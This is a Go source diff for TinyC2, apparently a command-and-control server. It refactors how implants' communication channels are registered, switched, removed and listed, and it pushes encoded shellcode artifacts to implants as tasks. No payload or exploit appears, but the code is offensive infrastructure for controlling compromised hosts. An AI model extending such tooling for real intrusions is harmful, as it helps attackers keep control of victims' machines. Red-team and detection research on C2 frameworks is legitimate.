@@ -12,16 +12,26 @@ import (
 
 	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
 	"github.com/0xPrimo/TinyC2/server/internal/pkg/pack"
+	"github.com/0xPrimo/TinyC2/server/internal/pkg/store"
 
 	"github.com/pterm/pterm"
 )
 
-type Implant struct {
+type Channel struct {
+	Name     string
 	ID       uint32
-	Seen     time.Time
-	Channel  string
-	Tasks    []map[string]any
-	Channels map[string]uint32
+	Protocol string
+	Fallback bool
+	InUse    bool
+}
+type Implant struct {
+	ID   uint32
+	Seen time.Time
+
+	Channels     *store.Store[string, *Channel]
+	ChannelInUse *Channel
+
+	Tasks []map[string]any
 }
 
 type TaskResult struct {
@@ -61,18 +71,33 @@ func (e *Engine) ImplantProcess(listener string, data []byte) ([]byte, error) {
 	}
 }
 
-func (e *Engine) ImplantRegister(id uint32, listener string) ([]byte, error) {
+func (e *Engine) ImplantRegister(id uint32, listenerName string) ([]byte, error) {
 	if e.ImplantExists(id) {
 		return []byte{}, fmt.Errorf("implant already exists")
 	}
 
-	e.Implants[id] = Implant{
-		ID:      id,
-		Channel: listener,
-		Channels: map[string]uint32{
-			listener: 0,
-		},
+	listener, ok := e.ListenerGet(listenerName)
+	if !ok {
+		return []byte{}, fmt.Errorf("listener not found")
 	}
+
+	channels := store.NewStore[string, *Channel]()
+	channel := &Channel{
+		Name:     listener.Name,
+		ID:       listener.ID,
+		Protocol: listener.Protocol,
+		Fallback: true,
+		InUse:    true,
+	}
+
+	channels.Set(listenerName, channel)
+	implant := Implant{
+		ID:           id,
+		ChannelInUse: channel,
+		Channels:     channels,
+	}
+
+	e.Implants[id] = implant
 
 	data, err := json.Marshal(map[string]any{"magic": "baadf00d"})
 	if err != nil {
@@ -81,7 +106,7 @@ func (e *Engine) ImplantRegister(id uint32, listener string) ([]byte, error) {
 	}
 
 	fmt.Println()
-	logger.Success("implant %X registred", id)
+	logger.Success("implant %X registered", id)
 
 	return data, nil
 }
@@ -162,9 +187,9 @@ func (e *Engine) ImplantList() error {
 
 	for id, implant := range e.Implants {
 		if e.ImplantIsAlive(id) {
-			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.Channel, pterm.Green("alive")})
+			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.ChannelInUse.Name, pterm.Green("alive")})
 		} else {
-			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.Channel, pterm.Red("dead")})
+			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.ChannelInUse.Name, pterm.Red("dead")})
 		}
 	}
 
@@ -188,16 +213,16 @@ func (e *Engine) ImplantChannelList(id uint32) error {
 	}
 
 	table := pterm.TableData{
-		{"ID", "Name"},
+		{"ID", "Name", "Protocol", "Fallback"},
 	}
 
-	for name, id := range implant.Channels {
-		if implant.Channel == name {
-			table = append(table, []string{pterm.Green(fmt.Sprintf("* %X", id)), pterm.Green(name)})
+	implant.Channels.ForEach(func(key string, value *Channel) {
+		if value.InUse {
+			table = append(table, []string{pterm.Green(fmt.Sprintf("* %X", value.ID)), pterm.Green(value.Name), pterm.Green(value.Protocol), pterm.Green(value.Fallback)})
 		} else {
-			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), name})
+			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", value.ID)), value.Name, value.Protocol, pterm.LightBlue(value.Fallback)})
 		}
-	}
+	})
 
 	pterm.Println()
 	pterm.DefaultTable.
@@ -218,31 +243,37 @@ func (e *Engine) ImplantChannelRegister(id uint32, name string) error {
 		return nil
 	}
 
+	if implant.Channels.Has(name) {
+		logger.Error("channel %s already registered", name)
+		return nil
+	}
+
 	// generate pic
-	listener, exists := e.Listeners.Get(name)
+	listener, exists := e.ListenerGet(name)
 	if !exists {
 		logger.Error("listener %s does not exists", name)
 		return nil
 	}
 
-	if listener.ID == 0 {
-		logger.Error("%s is a default channel", name)
-		return nil
-	}
-
-	pic, args, err := listener.Extension(listener.ID)
+	pic, err := e.ListenerExtension(listener.Name)
 	if err != nil {
-		logger.Error("MakePic error: %v", err)
+		logger.Error("%v", err)
 		return nil
 	}
 
-	implant.Channels[name] = listener.ID
+	implant.Channels.Set(listener.Name, &Channel{
+		Name:     listener.Name,
+		ID:       listener.ID,
+		Protocol: listener.Protocol,
+		Fallback: false,
+	})
+
 	e.Implants[id] = implant
 
 	// execute channel.register command
 	e.ImplantTaskExecute(id, map[string]any{
 		"name":     "channel.register",
-		"args":     []string{base64.StdEncoding.EncodeToString(args)},
+		"args":     nil,
 		"artifact": base64.StdEncoding.EncodeToString(pic),
 	})
 
@@ -256,24 +287,26 @@ func (e *Engine) ImplantChannelSwitch(id uint32, name string) error {
 		return nil
 	}
 
-	if implant.Channel == name {
-		logger.Error("channel %s is currently used", name)
+	channel, ok := implant.Channels.Get(name)
+	if !ok {
+		logger.Error("channel %s does not exists", pterm.Cyan(name))
 		return nil
 	}
 
-	channel, exists := implant.Channels[name]
-	if !exists {
-		logger.Error("channel %s not registered", name)
+	if channel.InUse {
+		logger.Error("channel %s in use", pterm.Cyan(name))
 		return nil
 	}
 
-	implant.Channel = name
+	channel.InUse = true
+	implant.ChannelInUse.InUse = false
+	implant.ChannelInUse = channel
 	e.Implants[id] = implant
 
 	// execute channel.swtich command
 	e.ImplantTaskExecute(id, map[string]any{
 		"name":     "channel.switch",
-		"args":     []uint32{channel},
+		"args":     []uint32{channel.ID},
 		"artifact": nil,
 	})
 
@@ -287,29 +320,28 @@ func (e *Engine) ImplantChannelRemove(id uint32, name string) error {
 		return nil
 	}
 
-	channel, exists := implant.Channels[name]
-	if !exists {
+	channel, ok := implant.Channels.Get(name)
+	if !ok {
 		logger.Error("channel %s not registered", name)
 		return nil
 	}
 
-	if name == implant.Channel {
-		logger.Error("channel %s is currently used", name)
+	if channel.Fallback {
+		logger.Error("channel %s is fallback", pterm.Cyan(name))
 		return nil
 	}
 
-	if channel == 0 {
-		logger.Error("%s channel is a default channel", name)
+	if channel.InUse {
+		logger.Error("channel %s already in-use", pterm.Cyan(name))
 		return nil
 	}
 
-	delete(implant.Channels, name)
+	implant.Channels.Delete(name)
 	e.Implants[id] = implant
 
-	// execute channel.remove command
 	e.ImplantTaskExecute(id, map[string]any{
 		"name":     "channel.remove",
-		"args":     []uint32{channel},
+		"args":     []uint32{channel.ID},
 		"artifact": nil,
 	})
 
